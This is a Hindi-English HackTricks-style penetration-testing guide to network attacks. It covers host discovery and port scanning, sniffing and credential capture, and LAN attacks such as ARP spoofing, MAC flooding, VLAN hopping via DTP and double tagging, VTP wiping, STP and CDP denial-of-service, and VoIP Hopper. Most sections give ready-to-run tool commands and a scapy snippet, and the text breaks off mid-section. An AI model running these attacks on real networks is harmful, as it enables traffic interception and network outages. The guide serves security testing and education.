# Pentesting नेटवर्क

{{#include ../../banners/hacktricks-training.md}}



## बाहरी से hosts की खोज

यह एक **brief section** है कि कैसे **IPs responding** को **Internet** से खोजा जाए।\
इस स्थिति में आपके पास कुछ **scope of IPs** (शायद कई **ranges**) हो सकते हैं और आपको बस यह पता लगाना है कि **which IPs are responding**।

### ICMP

यह **easiest** और **fastest** तरीका है यह पता लगाने का कि कोई host up है या नहीं।\
आप कुछ **ICMP** पैकेट भेजकर **expect responses** की कोशिश कर सकते हैं। सबसे आसान तरीका है सिर्फ एक **echo request** भेजना और response की उम्मीद करना। आप यह एक साधारण `ping`or using `fping`for **ranges** कर सकते हैं।\
आप अन्य प्रकार के ICMP पैकेट भेजने के लिए **nmap** का भी उपयोग कर सकते हैं (यह सामान्य ICMP echo request-response पर लागू होने वाले फ़िल्टरों से बचने में मदद करेगा)।
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port खोज

यह बहुत आम है कि सभी तरह के ICMP पैकेट फ़िल्टर किए जा रहे हों। तो, किसी host के up होने की जाँच करने के लिए आप कर सकते हैं **try to find open ports**। प्रत्येक host के पास **65535 ports** होते हैं, इसलिए यदि आपका "बड़ा" स्कोप है तो आप **प्रत्येक port** की जाँच नहीं कर सकते कि वे open हैं या नहीं, यह बहुत समय लेगा.\
तो, आपको चाहिए एक **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) और उन **अधिक उपयोग होने वाले ports** की सूची:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
आप यह कदम `nmap` के साथ भी कर सकते हैं, लेकिन यह धीमा है और कुछ हद तक `nmap` को होस्ट्स को ऑनलाइन पहचानने में समस्याएँ होती हैं।

### HTTP पोर्ट खोज

यह केवल एक TCP पोर्ट खोज है जो उपयोगी है जब आप **HTTP सेवाओं की खोज** पर ध्यान केंद्रित करना चाहें:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

आप कुछ **UDP port open** की जाँच भी कर सकते हैं यह तय करने के लिए कि आपको **अधिक ध्यान देना चाहिए** किसी **host.** चूँकि **UDP services** आम तौर पर एक सामान्य खाली UDP probe packet पर **प्रतिक्रिया नहीं देते** और **कोई डेटा** वापस नहीं करते, इसलिए यह कहना मुश्किल है कि कोई port filtered है या open. इसे तय करने का सबसे आसान तरीका है कि चल रहे service से संबंधित एक packet भेजें, और चूँकि आपको पता नहीं है कौन सा service चल रहा है, आपको port number के आधार पर सबसे संभावित कोशिश करनी चाहिए:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
पहले प्रस्तावित nmap लाइन हर host में **top 1000 UDP ports** को **/24** रेंज के भीतर टेस्ट करेगी, लेकिन केवल यह भी **>20min** लेगा। यदि आपको **fastest results** चाहिए तो आप [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) का उपयोग कर सकते हैं: `./udp-proto-scanner.pl 199.66.11.53/24`। यह इन **UDP probes** को उनके **expected port** पर भेजेगा (एक /24 रेंज के लिए यह सिर्फ 1 min लेगा): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

यहाँ आप लेखन के समय ज्ञात सभी well known Wifi attacks का एक अच्छा मार्गदर्शक पा सकते हैं:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## अंदर से hosts की खोज

यदि आप network के अंदर हैं, तो पहली चीज़ों में से एक जो आप करना चाहेंगे वह है **discover other hosts**। आप कितनी **how much noise** कर सकते/चाहते हैं, इसके आधार पर अलग-अलग क्रियाएँ की जा सकती हैं:

### Passive

आप इन tools का उपयोग एक connected network के भीतर hosts को passive रूप से खोजने के लिए कर सकते हैं:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### सक्रिय

ध्यान दें कि [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) में टिप्पणी की गई तकनीकें (_TCP/HTTP/UDP/SCTP Port Discovery_) यहाँ भी **लागू की जा सकती हैं**.\
लेकिन, चूँकि आप अन्य hosts के साथ **एक ही नेटवर्क** में हैं, आप **और भी कई चीज़ें** कर सकते हैं:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### सक्रिय ICMP

ध्यान दें कि _बाहर से hosts की खोज_ ([_**ICMP**_](#icmp)) में बतायी तकनीकें यहाँ भी **लागू की जा सकती हैं**।\
पर, चूंकि आप अन्य hosts के **same network** में हैं, आप और भी **ज़्यादा चीज़ें** कर सकते हैं:

- अगर आप **ping** किसी **subnet broadcast address** पर करते हैं तो ping **हर host** तक पहुँचना चाहिए और वे **आपको** जवाब दे सकते हैं: `ping -b 10.10.5.255`
- **network broadcast address** पर ping करने से आप **other subnets** के अंदर के hosts भी खोज सकते हैं: `ping -b 255.255.255.255`
- `nmap` के `-PE`, `-PP`, `-PM` flags का उपयोग host discovery के लिए करें, जो क्रमशः **ICMPv4 echo**, **timestamp**, और **subnet mask requests** भेजते हैं: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan का उपयोग कंप्यूटरों को एक **network message** के माध्यम से **turn on** करने के लिए किया जाता है। उस कंप्यूटर को चालू करने के लिए उपयोग किया जाने वाला magic packet केवल एक ऐसा packet होता है जिसमें एक **MAC Dst** दिया होता है और फिर वही MAC उसी packet के अंदर **16 बार पुनरावृत्ति** होता है।\
ऐसे packets सामान्यतः **ethernet 0x0842** में या **UDP packet to port 9** में भेजे जाते हैं।\
यदि **कोई [MAC]** प्रदान नहीं किया गया है, तो packet **broadcast ethernet** पर भेजा जाता है (और broadcast MAC वही होगा जो पुनरावृत्त किया जा रहा है)।
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## होस्ट स्कैनिंग

एक बार जब आपने उन सभी IPs (बाहरी या आंतरिक) का पता लगा लिया है जिन्हें आप गहराई से scan करना चाहते हैं, तो विभिन्न क्रियाएँ की जा सकती हैं।

### TCP

- **Open** पोर्ट: _SYN --> SYN/ACK --> RST_
- **Closed** पोर्ट: _SYN --> RST/ACK_
- **Filtered** पोर्ट: _SYN --> \[NO RESPONSE]_
- **Filtered** पोर्ट: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

There are 2 options to scan an UDP port:

- एक **UDP packet** भेजें और रिस्पॉन्स _**ICMP unreachable**_ की जांच करें अगर पोर्ट **closed** है (कई मामलों में ICMP **filtered** हो सकता है, इसलिए आपको यह जानकारी नहीं मिलेगी कि पोर्ट **closed** है या **open**)।
- किसी **service** से response प्राप्त करने के लिए **formatted datagrams** भेजें (जैसे DNS, DHCP, TFTP, और अन्य, जो _nmap-payloads_ में सूचीबद्ध हैं)। यदि आपको **response** मिलती है, तो पोर्ट **open** है।

**Nmap** "-sV" का उपयोग करके दोनों विकल्पों को **mix both** करेगा (UDP scans बहुत धीमे होते हैं), लेकिन ध्यान दें कि UDP scans TCP scans की तुलना में धीमे होते हैं:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP स्कैन

**SCTP (Stream Control Transmission Protocol)** को **TCP (Transmission Control Protocol)** और **UDP (User Datagram Protocol)** के साथ उपयोग करने के लिए डिज़ाइन किया गया है। इसका मुख्य उद्देश्य IP नेटवर्क पर टेलीफोनी डेटा के परिवहन की सुविधा प्रदान करना है, जो **Signaling System 7 (SS7)** में पाए जाने वाले कई विश्वसनीयता विशेषताओं का अनुकरण करता है। **SCTP** **SIGTRAN** प्रोटोकॉल परिवार का एक मूल घटक है, जिसका उद्देश्य SS7 सिग्नल्स को IP नेटवर्क पर ट्रांसपोर्ट करना है।

**SCTP** के लिए समर्थन विभिन्न ऑपरेटिंग सिस्टम्स द्वारा प्रदान किया जाता है, जैसे कि **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, और **VxWorks**, जो टेलीकम्युनिकेशन और नेटवर्किंग के क्षेत्र में इसकी व्यापक स्वीकृति और उपयोगिता को दर्शाता है।

SCTP के लिए nmap दो अलग स्कैन प्रदान करता है: _-sY_ और _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **More nmap options**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### आंतरिक IP पतों का खुलासा

**Misconfigured routers, firewalls, and network devices** कभी-कभी network probes का जवाब **nonpublic source addresses** का उपयोग करके देते हैं। **tcpdump** का उपयोग परीक्षण के दौरान **private addresses** से प्राप्त पैकेट्स की पहचान करने के लिए किया जा सकता है। विशेष रूप से, Kali Linux पर, पैकेट्स **eth2 interface** पर capture किए जा सकते हैं, जो public Internet से accessible है। ध्यान देने योग्य है कि यदि आपकी सेटअप NAT या Firewall के पीछे है, तो ऐसे पैकेट्स संभवतः filter हो जाएंगे।
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing के दौरान, captured frames और packets की समीक्षा करके आप IP ranges, subnet sizes, MAC addresses, और hostnames के विवरण जान सकते हैं। यदि नेटवर्क misconfigured है या switching fabric पर तनाव में है, तो हमलावर passive network sniffing के माध्यम से संवेदनशील सामग्री capture कर सकते हैं।

यदि एक switched Ethernet network सही तरीके से configured है, तो आप केवल broadcast frames और आपके MAC address के लिए destined material ही देखेंगे।

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
आप SSH सत्र के माध्यम से रिमोट मशीन से packets को Wireshark को GUI के रूप में उपयोग करके realtime में भी कैप्चर कर सकते हैं।
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

बेशक।

### Capturing credentials

आप [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) जैसे tools का उपयोग करके pcap या live interface से credentials को parse कर सकते हैं।

## LAN हमले

### ARP spoofing

ARP Spoofing में gratuitous ARPResponses भेजना शामिल है ताकि यह संकेत दिया जा सके कि किसी मशीन का IP हमारे डिवाइस के MAC के साथ है। फिर, victim ARP table को बदल देगा और जब भी वह spoofed IP से संपर्क करना चाहेगा तो वह हमारी मशीन से संपर्क करेगा।

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

switch’s CAM table को ओवरफ्लो करें, बहुत सारे पैकेट भेजकर जिनके अलग-अलग source mac address हों। जब CAM table भर जाती है तो switch hub की तरह व्यवहार करने लगता है (सारा ट्रैफ़िक ब्रॉडकास्ट करता है)।
```bash
macof -i <interface>
```
आधुनिक switches में यह भेद्यता ठीक कर दी गई है।

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)** को लिंक लेयर प्रोटोकॉल के रूप में डिज़ाइन किया गया है ताकि trunking के लिए एक स्वचालित सिस्टम सक्षम हो सके, जिससे switches अपने आप पोर्ट्स को Trunk मोड या non-trunk मोड के लिए चुन सकते हैं। DTP का उपयोग अक्सर suboptimal network design का संकेत माना जाता है, जो यह दर्शाता है कि trunk केवल आवश्यक जगहों पर मैन्युअली कॉन्फ़िगर किए जाने चाहिए और उचित documentation सुनिश्चित की जानी चाहिए।

डिफ़ॉल्ट रूप से, switch पोर्ट्स Dynamic Auto mode पर सेट होते हैं, यानी वे पड़ोसी switch द्वारा संकेत मिलने पर trunking प्रारंभ करने के लिये तैयार रहते हैं। सुरक्षा चिंता तब उत्पन्न होती है जब कोई pentester या attacker switch से कनेक्ट करके एक DTP Desirable frame भेजता है, जिससे पोर्ट मजबूर होकर trunk mode में चला जाता है। इस क्रिया से attacker STP frame विश्लेषण के माध्यम से VLANs को सूचीबद्ध कर सकता है और virtual interfaces सेट करके VLAN segmentation को बाईपास कर सकता है।

कई switches में डिफ़ॉल्ट रूप से DTP की उपस्थिति का दुरुपयोग adversaries द्वारा एक switch का व्यवहार नकल करने के लिये किया जा सकता है, जिससे वे सभी VLANs के ट्रैफ़िक तक पहुँच प्राप्त कर लेते हैं। स्क्रिप्ट [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) का उपयोग किसी interface की निगरानी के लिये किया जाता है, यह दर्शाते हुए कि switch Default, Trunk, Dynamic, Auto, या Access mode में है — जिसमें Access ही एकमात्र कॉन्फ़िगरेशन है जो VLAN hopping attacks के प्रति सुरक्षित है। यह टूल switch की vulnerability स्थिति का आकलन करता है।

यदि नेटवर्क में vulnerability की पहचान होती है, तो _**Yersinia**_ टूल का उपयोग DTP प्रोटोकॉल के माध्यम से "enable trunking" करने के लिये किया जा सकता है, जिससे सभी VLANs के पैकेट्स का अवलोकन संभव हो जाता है।
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLANs की enumeration करने के लिए, [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** स्क्रिप्ट के साथ DTP Desirable frame जनरेट करना भी संभव है। D**o स्क्रिप्ट को किसी भी हालत में रोकें। यह हर तीन सेकंड में DTP Desirable इंजेक्ट करता है। **स्विच पर डायनामिक रूप से बनाए गए trunk channels केवल पांच मिनट के लिए ही रहते हैं। पाँच मिनट के बाद trunk डिस्कनेक्ट हो जाता है।**
```
sudo python3 DTPHijacking.py --interface eth0
```
मैं यह इंगित करना चाहूँगा कि **Access/Desirable (0x03)** बताता है कि DTP फ्रेम Desirable प्रकार का है, जो पोर्ट को Trunk mode में स्विच करने के लिए कहता है। और **802.1Q/802.1Q (0xa5** दर्शाता है **802.1Q** encapsulation type।

STP फ्रेम्स का विश्लेषण करके, **हमें VLAN 30 और VLAN 60 के मौजूद होने का पता चलता है।**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### विशिष्ट VLANs पर हमला

एक बार जब आप VLAN IDs और IPs मान जानते हैं, आप **configure a virtual interface to attack a specific VLAN** कर सकते हैं.\
यदि DHCP उपलब्ध नहीं है, तो स्थिर IP address सेट करने के लिए _ifconfig_ का उपयोग करें।

<details>
<summary>VLAN interface configuration (example)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

वर्णित हमला **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** other VLANs को टूल द्वारा **स्वचालित रूप से निष्पादित** किया जाता है: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

यदि attacker को victim host का **MAC, IP and VLAN ID of the victim host** पता है, तो वह उसके निर्दिष्ट VLAN और victim के VLAN के साथ एक फ्रेम को **double tag a frame** करके एक पैकेट भेजने का प्रयास कर सकता है। चूँकि **victim won't be able to connect back** with the attacker, इसलिए attacker के लिए सबसे अच्छा विकल्प **communicate via UDP** करना है ऐसे प्रोटोकॉल के साथ जो कुछ दिलचस्प क्रियाएँ कर सकें (जैसे SNMP)।

attacker का एक और विकल्प है कि वह **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (संभवतः इंटरनेट के माध्यम से) शुरू करे। फिर, attacker अपने दूसरे host पर sniff कर सकता है यदि उसे victim से कुछ packets प्राप्त होते हैं।

![](<../../images/image (190).png>)

इस attack को करने के लिए आप scapy का उपयोग कर सकते हैं: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

यदि आपके पास उस switch तक पहुँच है जिससे आप सीधे जुड़े हैं, तो आप नेटवर्क के भीतर **VLAN segmentation को bypass** करने में सक्षम हैं। बस पोर्ट को **trunk mode** में बदलें (जिसे otherwise known as trunk भी कहा जाता है), target VLANs के IDs के साथ virtual interfaces बनाएं, और एक IP address कॉन्फ़िगर करें। आप पता dynamically (DHCP) से माँगने की कोशिश कर सकते हैं या इसे statically कॉन्फ़िगर कर सकते हैं। यह स्थिति पर निर्भर करता है।

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

कुछ वातावरणों में, जैसे कि guest wireless networks, **port isolation (जिसे private VLAN भी कहा जाता है)** सेटिंग्स लागू की जाती हैं ताकि एक wireless access point से जुड़े क्लाइंट्स आपस में सीधे संवाद न कर सकें। हालांकि, एक तकनीक पहचानी गई है जो इन isolation उपायों को दरकिनार कर सकती है। यह तकनीक network ACLs की कमी या उनकी गलत configuration का फायदा उठाती है, जिससे IP packets को router के माध्यम से route करके उसी नेटवर्क पर मौजूद दूसरे क्लाइंट तक पहुँचाया जा सकता है।

हमला इस प्रकार किया जाता है कि एक ऐसा **packet तैयार किया जाता है जिसमें destination client का IP address होता है पर router का MAC address इस्तेमाल किया गया होता है**। इससे router गलती से उस packet को target client को आगे भेज देता है। यह तरीका Double Tagging Attacks में उपयोग किए गए उस दृष्टिकोण के समान है, जिसमें victim द्वारा पहुंच योग्य किसी host को नियंत्रित करने की क्षमता का उपयोग सुरक्षा दोष का शोषण करने के लिए किया जाता है।

**Key Steps of the Attack:**

1. **Crafting a Packet:** एक packet विशेष रूप से तैयार किया जाता है जिसमें target client का IP address शामिल होता है पर router का MAC address होता है।
2. **Exploiting Router Behavior:** तैयार किया गया packet router को भेजा जाता है, जो कि configuration के कारण उस packet को target client की ओर पुनर्निर्देशित कर देता है, जिससे private VLAN सेटिंग्स द्वारा प्रदान की गई isolation को bypass किया जा सकता है।

### VTP Attacks

VTP (VLAN Trunking Protocol) VLAN management को केंद्रीकृत करता है। यह VLAN database की integrity बनाए रखने के लिए revision numbers का उपयोग करता है; किसी भी modification से यह नंबर increment होता है। Switches उन configurations को अपनाते हैं जिनके revision numbers अधिक होते हैं, और अपना VLAN database अपडेट कर लेते हैं।

#### VTP Domain Roles

- **VTP Server:** VLANs को manage करता है—create, delete, modify करता है। यह domain सदस्यों को VTP announcements broadcast करता है।
- **VTP Client:** VTP announcements प्राप्त करता है ताकि अपना VLAN database synchronize कर सके। इस role को लोकल VLAN configuration में बदलाव करने से रोका जाता है।
- **VTP Transparent:** VTP updates में शामिल नहीं होता लेकिन VTP announcements को forward करता है। VTP attacks से प्रभावित नहीं होता, और इसका revision number हमेशा शून्य रहता है।

#### VTP Advertisement Types

- **Summary Advertisement:** VTP server द्वारा हर 300 seconds में broadcast किया जाता है, और इसमें आवश्यक domain जानकारी होती है।
- **Subset Advertisement:** VLAN configuration changes के बाद भेजा जाता है।
- **Advertisement Request:** VTP client द्वारा Summary Advertisement का अनुरोध करने के लिए जारी किया जाता है, आमतौर पर जब वह higher configuration revision number detect करता है।

VTP vulnerabilities केवल trunk ports के माध्यम से ही exploit की जा सकती हैं क्योंकि VTP announcements केवल इन्हीं से circulate होते हैं। Post-DTP attack परिदृश्यों में हमला VTP की ओर बदल सकता है। Yersinia जैसे tools VTP attacks को आसान बना सकते हैं, जिनका उद्देश्य VLAN database को wipe out करना होता है, जिससे नेटवर्क प्रभावी रूप से बाधित हो जाता है।

नोट: यह चर्चा VTP version 1 (VTPv1) से संबंधित है।
```bash
yersinia -G # Launch Yersinia in graphical mode
```
In Yersinia के ग्राफ़िकल मोड में, VLAN database को purge करने के लिए 'deleting all VTP vlans' option चुनें।

### STP Attacks

**यदि आप अपने interfaces पर BPDU frames capture नहीं कर सकते, तो संभवतः आप किसी भी STP attack में सफल नहीं होंगे।**

#### **STP BPDU DoS**

बहुत सारे BPDUs TCP (Topology Change Notification) या Conf (वे BPDUs जो topology बनने पर भेजे जाते हैं) भेजने से switches overloaded हो जाते हैं और वे सही ढंग से काम करना बंद कर देते हैं।
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

जब एक TCP भेजा जाता है, तो switches का CAM table 15s में हट जाता है। फिर, यदि आप इस तरह के packets लगातार भेजते रहते हैं, तो CAM table लगातार (या हर 15segs पर) restart होता रहेगा और जब यह restart होगा, तो switch hub की तरह व्यवहार करेगा
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

हमलावर एक स्विच के व्यवहार का अनुकरण करता है ताकि नेटवर्क का STP root बन जाए। फिर अधिक डेटा उसके माध्यम से गुजरने लगेगा। यह तब उपयोगी होता है जब आप दो अलग-अलग स्विच से जुड़े होते हैं.\
यह BPDUs CONF packets भेजकर किया जाता है जो बताते हैं कि **priority** मान वर्तमान root switch की वास्तविक priority से कम है।
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**यदि हमलावर 2 स्विचों से जुड़ा है तो वह नई ट्री का root बन सकता है और उन स्विचों के बीच सारा ट्रैफ़िक उसके माध्यम से गुज़रेगा** (a MITM attack will be performed).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) CISCO डिवाइसों के बीच संचार के लिए आवश्यक है, जो उन्हें एक-दूसरे को **पहचानने और कॉन्फ़िगरेशन विवरण साझा करने** की अनुमति देता है।

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP को सभी पोर्ट्स के माध्यम से जानकारी ब्रॉडकास्ट करने के लिए कॉन्फ़िगर किया जाता है, जो सुरक्षा जोखिम पैदा कर सकता है। कोई हमलावर स्विच पोर्ट से कनेक्ट होकर network sniffers जैसे **Wireshark**, **tcpdump**, या **Yersinia** चला सकता है। यह कार्य नेटवर्क डिवाइस के बारे में संवेदनशील जानकारी उजागर कर सकता है, जैसे उसका मॉडल और जिस Cisco IOS वर्जन पर यह चलता है। तब हमलावर पहचाने गए Cisco IOS वर्जन में मौजूद विशिष्ट कमजोरियों को लक्षित कर सकता है।

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

एक अधिक आक्रामक तरीका स्विच की मेमोरी को ओवरव्हेल्म करके और वैध CISCO डिवाइस बनने का नाटक करते हुए Denial of Service (DoS) हमला शुरू करना है। नीचे Yersinia का उपयोग करके ऐसे हमले को शुरू करने के लिए कमांड अनुक्रम दिया गया है, जो परीक्षण के लिए डिज़ाइन किया गया एक network tool है:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
इस हमले के दौरान, स्विच का CPU और CDP neighbor table भारी रूप से बोझिल हो जाते हैं, जिससे अत्यधिक संसाधन खपत के कारण अक्सर **“network paralysis”** कहा जाता है।

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP Attacks and the VoIP Hopper Tool

VoIP phones, जो धीरे-धीरे IoT devices के साथ एकीकृत हो रहे हैं, विशेष फोन नंबरों के जरिए दरवाज़े खोलने या thermostats नियंत्रित करने जैसी कार्यक्षमताएँ प्रदान करते हैं। लेकिन यह एकीकरण सुरक्षा जोखिम पैदा कर सकता है।

The tool [**voiphopper**](http://voiphopper.sourceforge.net) is designed to emulate a VoIP phone in various environments (Cisco, Avaya, Nortel, Alcatel-Lucent). It discovers the voice network's VLAN ID using protocols like CDP, DHCP, LLDP-MED, and 802.1Q ARP.

**VoIP Hopper** offers three modes for the Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): नेटवर्क पैकेट्स का विश्लेषण कर VLAN ID पहचानता है।
2. **Spoof Mode** (`-c 1`): वास्तविक VoIP device के पैकेट्स की नकल करते हुए कस्टम packets जनरेट करता है।
3. **Spoof with Pre-made Packet Mode** (`-c 2`): किसी विशिष्ट Cisco IP phone मॉडल के पैकेट्स के समान packets भेजता है।

The preferred mode for speed is the third one. It requires specifying:

- एटैकर का network interface (`-i` parameter)।
- नकल किए जा रहे VoIP device का नाम (`-E` parameter), Cisco naming format का पालन करते हुए (उदा., SEP के बाद MAC address)।

In corporate settings, to mimic an existing VoIP device, one might:

- फोन पर लगे MAC लेबल को जाँचें।
- फोन की display settings में जाकर मॉडल जानकारी देखें।
- VoIP device को laptop से कनेक्ट करें और Wireshark का उपयोग करके CDP requests को देखें।

An example command to execute the tool in the third mode would be:
```bash
